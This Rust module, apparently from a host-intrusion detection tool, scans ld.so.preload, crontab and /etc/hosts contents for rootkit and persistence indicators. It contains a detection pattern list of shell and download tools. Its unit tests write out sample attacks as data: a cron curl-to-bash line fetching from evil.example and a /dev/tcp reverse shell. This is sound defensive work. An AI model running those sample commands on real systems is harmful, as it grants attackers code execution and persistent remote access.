//! Content-based rootcheck inspections.
//!
//! The [`signatures`](crate::signatures) module only flags paths by
//! existence. Many rootkit indicators live instead inside legitimate
//! configuration files — the presence of `/etc/ld.so.preload`, say,
//! is not suspicious on its own, but an entry pointing at
//! `/usr/lib/libprocesshider.so` very much is.
//!
//! This module adds content-based inspection for three classes of
//! file that real-world rootkits and host-compromise playbooks
//! manipulate:
//!
//! 1. **`/etc/ld.so.preload`** — any entry that is not on the built-in
//!    benign allow-list is flagged. This mirrors upstream Wazuh
//!    rootcheck's `rootkit_trojans.txt` behaviour and catches the
//!    `libprocesshider`-family LD_PRELOAD rootkits.
//! 2. **`/etc/crontab` and `/var/spool/cron/`** — looks for unusual
//!    commands, hidden-file payloads, and pipe-to-shell / reverse
//!    shell patterns that persistence backdoors install.
//! 3. **`/etc/hosts`** — flags redirections of well-known security-
//!    update / antivirus domains to arbitrary IPs, which malware
//!    routinely uses to disable signature updates.
//!
//! All checks are pure functions that take file contents as input
//! and return `Vec<ContentHit>`, so unit tests can exercise them
//! without touching the real filesystem.

use std::path::Path;

/// A single content-based rootcheck hit.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ContentHit {
    /// Human-readable category (used as the alert subject prefix).
    pub category: &'static str,
    /// Absolute path of the file the hit was found in.
    pub path: String,
    /// Which entry / line triggered the check (trimmed, PII-free).
    pub indicator: String,
    /// Short human-readable reason for the hit.
    pub reason: String,
}

/// Paths whose content is inspected by [`scan`].
pub const INSPECTED_FILES: &[&str] = &[
    "/etc/ld.so.preload",
    "/etc/crontab",
    "/etc/hosts",
    "/var/spool/cron/crontabs/root",
    "/var/spool/cron/root",
];

/// Benign `/etc/ld.so.preload` entries used by mainstream userspace
/// allocators / sandboxing tools. Anything *not* on this list is
/// flagged so an operator can audit it. The list is deliberately
/// short — it's easier to add one missing entry per site than to
/// exclude a real compromise.
const LD_PRELOAD_ALLOWLIST: &[&str] = &[
    "/usr/lib/libjemalloc.so",
    "/usr/lib/libjemalloc.so.1",
    "/usr/lib/libjemalloc.so.2",
    "/usr/lib/libtcmalloc.so",
    "/usr/lib/libtcmalloc.so.4",
    "/usr/lib/libtcmalloc_minimal.so",
    "/usr/lib/libtcmalloc_minimal.so.4",
    "/usr/lib/libmimalloc.so",
    "/usr/lib/x86_64-linux-gnu/libjemalloc.so",
    "/usr/lib/x86_64-linux-gnu/libjemalloc.so.2",
    "/usr/lib/x86_64-linux-gnu/libtcmalloc.so.4",
    "/usr/lib/x86_64-linux-gnu/libtcmalloc_minimal.so.4",
    "/usr/lib/aarch64-linux-gnu/libjemalloc.so.2",
    "/usr/lib/aarch64-linux-gnu/libtcmalloc.so.4",
    "/usr/$LIB/liboom.so",
    "/lib64/libsafe.so.2",
];

/// Security-update / antivirus domains that malware commonly hijacks
/// via `/etc/hosts`. Any line that maps one of these to an IP other
/// than `127.0.0.1`/`0.0.0.0`/`::1` is flagged. Redirecting to a
/// loopback address is also suspicious but is produced by legitimate
/// administrative overrides, so we only call out non-loopback
/// redirections here.
const SUSPICIOUS_HOSTS_DOMAINS: &[&str] = &[
    "update.microsoft.com",
    "windowsupdate.microsoft.com",
    "download.windowsupdate.com",
    "clamav.net",
    "database.clamav.net",
    "update.avast.com",
    "update.avira.com",
    "definitions.symantec.com",
    "updates.kaspersky.com",
    "go.eset.com",
    "download.bitdefender.com",
    "security.ubuntu.com",
    "deb.debian.org",
    "security.debian.org",
    "mirrors.fedoraproject.org",
    "packages.microsoft.com",
];

/// Substrings that frequently appear in malicious `cron` entries —
/// reverse shells, pipe-to-shell downloads, and hidden-file payloads.
///
/// The list is intentionally conservative to keep false-positive
/// rates low on developer workstations, which routinely have entries
/// running `make`, `cargo`, `python -c …`. Operators can layer
/// additional detections on top via the LDE rule bundle.
const SUSPICIOUS_CRON_PATTERNS: &[&str] = &[
    "curl ",
    "wget ",
    " | sh",
    " | bash",
    "|sh ",
    "|bash ",
    "/dev/tcp/",
    "nc -",
    "ncat -",
    "/tmp/.",
    "/dev/shm/.",
    "base64 -d",
    "python -c",
    "perl -e",
    "eval $(",
    "bash -i",
];

/// Run every content check against `root`. When `root` is `"/"` the
/// real filesystem paths in [`INSPECTED_FILES`] are consulted;
/// otherwise `root` is used as a prefix so tests can hand a
/// `tempdir` in and inspect synthetic payloads.
pub fn scan(root: &Path) -> Vec<ContentHit> {
    let mut hits = Vec::new();
    for rel in INSPECTED_FILES {
        let stripped = rel.trim_start_matches('/');
        let path = if root == Path::new("/") {
            Path::new(rel).to_path_buf()
        } else {
            root.join(stripped)
        };

        let display_path = path.to_string_lossy().to_string();
        let contents = match std::fs::read_to_string(&path) {
            Ok(c) => c,
            Err(_) => continue,
        };

        match *rel {
            "/etc/ld.so.preload" => {
                hits.extend(inspect_ld_so_preload(&display_path, &contents));
            }
            "/etc/crontab" => {
                hits.extend(inspect_crontab(&display_path, &contents));
            }
            "/etc/hosts" => {
                hits.extend(inspect_hosts(&display_path, &contents));
            }
            "/var/spool/cron/crontabs/root" | "/var/spool/cron/root" => {
                hits.extend(inspect_crontab(&display_path, &contents));
            }
            _ => {}
        }
    }
    hits
}

/// Inspect the text of `/etc/ld.so.preload` (one preloaded library
/// per line). Any entry that is not on [`LD_PRELOAD_ALLOWLIST`] is
/// reported.
pub fn inspect_ld_so_preload(path: &str, contents: &str) -> Vec<ContentHit> {
    let mut hits = Vec::new();
    for raw in contents.lines() {
        let line = raw.trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }
        if LD_PRELOAD_ALLOWLIST.contains(&line) {
            continue;
        }
        hits.push(ContentHit {
            category: "ld_so_preload",
            path: path.to_string(),
            indicator: line.to_string(),
            reason: format!(
                "ld.so.preload entry '{}' is not on the built-in allow-list of known-benign preloaded libraries",
                line
            ),
        });
    }
    hits
}

/// Inspect the text of a crontab file. Comments and empty lines are
/// skipped; otherwise every remaining line is searched for the
/// [`SUSPICIOUS_CRON_PATTERNS`] substrings.
pub fn inspect_crontab(path: &str, contents: &str) -> Vec<ContentHit> {
    let mut hits = Vec::new();
    for raw in contents.lines() {
        let line = raw.trim_start();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }
        for pattern in SUSPICIOUS_CRON_PATTERNS {
            if line.contains(pattern) {
                hits.push(ContentHit {
                    category: "crontab",
                    path: path.to_string(),
                    indicator: line.trim().to_string(),
                    reason: format!(
                        "crontab entry contains '{}' which is a common persistence pattern",
                        pattern.trim()
                    ),
                });
                break;
            }
        }
    }
    hits
}

/// Inspect `/etc/hosts` text. Flags any line that maps a
/// [`SUSPICIOUS_HOSTS_DOMAINS`] entry to a non-loopback address.
pub fn inspect_hosts(path: &str, contents: &str) -> Vec<ContentHit> {
    let mut hits = Vec::new();
    for raw in contents.lines() {
        let line = raw.trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }
        let mut parts = line.split_whitespace();
        let Some(ip) = parts.next() else { continue };
        let ip_owned = ip.to_string();
        let is_loopback =
            ip == "127.0.0.1" || ip == "0.0.0.0" || ip == "::1" || ip.starts_with("127.");
        for host in parts {
            if host.starts_with('#') {
                break;
            }
            let normalized = host.trim_matches('.').to_ascii_lowercase();
            let matches_suspicious = SUSPICIOUS_HOSTS_DOMAINS
                .iter()
                .any(|d| normalized == *d || normalized.ends_with(&format!(".{d}")));
            if matches_suspicious && !is_loopback {
                hits.push(ContentHit {
                    category: "hosts",
                    path: path.to_string(),
                    indicator: format!("{ip_owned}  {normalized}"),
                    reason: format!(
                        "/etc/hosts redirects security-update domain '{}' to non-loopback IP '{}'",
                        normalized, ip_owned
                    ),
                });
            }
        }
    }
    hits
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;
    use tempfile::TempDir;

    #[test]
    fn ld_preload_empty_is_clean() {
        let hits = inspect_ld_so_preload("/etc/ld.so.preload", "");
        assert!(hits.is_empty());
    }

    #[test]
    fn ld_preload_comments_and_blank_lines_ignored() {
        let text = "\n# harmless comment\n  \n";
        assert!(inspect_ld_so_preload("/etc/ld.so.preload", text).is_empty());
    }

    #[test]
    fn ld_preload_allowlisted_entries_are_clean() {
        let text = "/usr/lib/libjemalloc.so.2\n/usr/lib/x86_64-linux-gnu/libtcmalloc.so.4\n";
        assert!(inspect_ld_so_preload("/etc/ld.so.preload", text).is_empty());
    }

    #[test]
    fn ld_preload_unknown_entry_flagged() {
        let text = "/usr/lib/libprocesshider.so\n";
        let hits = inspect_ld_so_preload("/etc/ld.so.preload", text);
        assert_eq!(hits.len(), 1);
        assert_eq!(hits[0].category, "ld_so_preload");
        assert_eq!(hits[0].indicator, "/usr/lib/libprocesshider.so");
    }

    #[test]
    fn ld_preload_multiple_mixed_entries_only_flag_unknowns() {
        let text = concat!(
            "# preload config\n",
            "/usr/lib/libjemalloc.so.2\n",
            "/opt/attacker/libevil.so\n",
            "/usr/lib/libtcmalloc.so.4\n",
        );
        let hits = inspect_ld_so_preload("/etc/ld.so.preload", text);
        assert_eq!(hits.len(), 1);
        assert_eq!(hits[0].indicator, "/opt/attacker/libevil.so");
    }

    #[test]
    fn crontab_normal_entries_clean() {
        let text = concat!(
            "# m h dom mon dow user command\n",
            "0 3 * * * root /usr/bin/apt-get update\n",
            "*/10 * * * * ubuntu /usr/local/bin/ansible-pull\n",
        );
        let hits = inspect_crontab("/etc/crontab", text);
        assert!(hits.is_empty(), "got unexpected hits: {:?}", hits);
    }

    #[test]
    fn crontab_curl_pipe_shell_flagged() {
        let text = "*/5 * * * * root curl -s http://evil.example/payload.sh | bash\n";
        let hits = inspect_crontab("/etc/crontab", text);
        assert!(
            !hits.is_empty(),
            "curl|bash cron entry should be flagged: {:?}",
            hits
        );
        assert_eq!(hits[0].category, "crontab");
    }

    #[test]
    fn crontab_dev_tcp_reverse_shell_flagged() {
        let text = "* * * * * root bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'\n";
        let hits = inspect_crontab("/etc/crontab", text);
        assert!(!hits.is_empty());
    }

    #[test]
    fn crontab_comments_ignored() {
        let text = "# curl -s http://evil.example | bash\n";
        assert!(inspect_crontab("/etc/crontab", text).is_empty());
    }

    #[test]
    fn hosts_normal_entries_clean() {
        let text = concat!(
            "# The following lines are desirable for IPv4 capable hosts\n",
            "127.0.0.1   localhost\n",
            "::1         localhost ip6-localhost ip6-loopback\n",
            "192.168.1.5 build-host.internal\n",
        );
        let hits = inspect_hosts("/etc/hosts", text);
        assert!(hits.is_empty(), "got unexpected hits: {:?}", hits);
    }

    #[test]
    fn hosts_redirecting_update_microsoft_to_attacker_ip_flagged() {
        let text = "45.33.32.156 update.microsoft.com download.windowsupdate.com\n";
        let hits = inspect_hosts("/etc/hosts", text);
        assert_eq!(hits.len(), 2, "expected two hits, got: {:?}", hits);
        assert!(hits.iter().all(|h| h.category == "hosts"));
    }

    #[test]
    fn hosts_redirecting_to_loopback_is_tolerated() {
        // Loopback redirections are a common admin technique (ad-blockers,
        // dev/staging environments) so we don't fire on them.
        let text = "127.0.0.1 update.microsoft.com\n";
        let hits = inspect_hosts("/etc/hosts", text);
        assert!(
            hits.is_empty(),
            "loopback redirect should not fire: {:?}",
            hits
        );
    }

    #[test]
    fn hosts_subdomain_of_flagged_domain_also_flagged() {
        let text = "45.33.32.156 asia.update.microsoft.com\n";
        let hits = inspect_hosts("/etc/hosts", text);
        assert_eq!(hits.len(), 1);
    }

    #[test]
    fn scan_uses_tempdir_layout_when_root_overridden() {
        let tmp = TempDir::new().unwrap();
        let etc = tmp.path().join("etc");
        fs::create_dir_all(&etc).unwrap();
        fs::write(
            etc.join("ld.so.preload"),
            "/opt/attacker/libprocesshider.so\n",
        )
        .unwrap();
        fs::write(etc.join("hosts"), "45.33.32.156 update.microsoft.com\n").unwrap();
        fs::write(
            etc.join("crontab"),
            "* * * * * root curl -s http://evil.example/x | bash\n",
        )
        .unwrap();

        let hits = scan(tmp.path());
        assert!(hits.iter().any(|h| h.category == "ld_so_preload"));
        assert!(hits.iter().any(|h| h.category == "hosts"));
        assert!(hits.iter().any(|h| h.category == "crontab"));
    }

    #[test]
    fn scan_silent_when_files_absent() {
        let tmp = TempDir::new().unwrap();
        // No /etc/ tree exists at all under the tempdir.
        let hits = scan(tmp.path());
        assert!(hits.is_empty());
    }
}
